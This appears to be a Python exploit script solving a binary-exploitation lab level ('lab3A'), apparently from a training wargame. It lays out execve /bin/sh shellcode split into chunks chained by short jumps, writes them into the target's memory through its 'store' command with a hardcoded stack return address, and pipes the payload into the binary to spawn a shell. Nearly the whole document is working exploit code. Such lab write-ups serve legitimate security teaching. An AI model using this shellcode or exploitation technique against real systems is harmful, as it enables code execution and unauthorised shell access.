"""
Nan, now I must use shellcode
----Shellcode http://shell-storm.org/shellcode/files/shellcode-811.php---------
0:  31 c0                   xor    eax,eax
2:  50                      push   eax
3:  68 2f 2f 73 68          push   0x68732f2f
8:  68 2f 62 69 6e          push   0x6e69622f
d:  89 e3                   mov    ebx,esp
f:  89 c1                   mov    ecx,eax
11: 89 c2                   mov    edx,eax
13: b0 0b                   mov    al,0xb
15: cd 80                   int

---- split shellcode ----
<-----6 bytes----><jmp4>
31 c0 50 90 90 90 eb 04
68 2f 2f 73 68 90 eb 04
68 2f 62 69 6e 90 eb 04
89 e3 89 c1 89 c2 eb 04
b0 0b cd 80 90 90 eb 04
----- convet to little endian -------
0x9050c031 
0xeb049090 
0x732f2f68 
0xeb049068 
0x69622f68 
0x04eb906e 
0xc189e389 
0x04ebc289 
0x08cd0bb0
"""
f=open("/tmp/payload","w")
addr=0xbffff548
def store(number,index):
        print("store",file=f)
        print(str(number),file=f)
        print(str(index),file=f)
store(addr,109)
store(0x90909090, 1)

store(0x90909090,2)
store(0x90909090, 4)
store(0x04eb9090, 5)
 
store(0x90909090, 7)
store(0x04eb9090, 8)
 
store(0x90909090, 10)
store(0x04eb9090, 11)
 
store(0x90909090, 13)
store(0x04eb9090, 14)
 
store(0x9050c031, 16) # xor eax, eax; push eax
store(0x04eb9090, 17)
 
store(0x732f2f68, 19) # push 0x68732f2f
store(0x04eb9068, 20)
 
store(0x69622f68, 22) # push 0x6e69622f
store(0x04eb906e, 23)
 
store(0xc189e389, 25) # mov ebx, esb; mov ecx, eax; mov edx, eax
store(0x04ebc289, 26)
 
store(0x80cd0bb0, 28) # mov al, 0xb; int 0x80

print("quit",file=f)
f.close()
import os
os.system("cd /levels/lab03/ && (cat /tmp/payload;cat) | ./lab3A")
os.system("rm -f /tmp/payload")
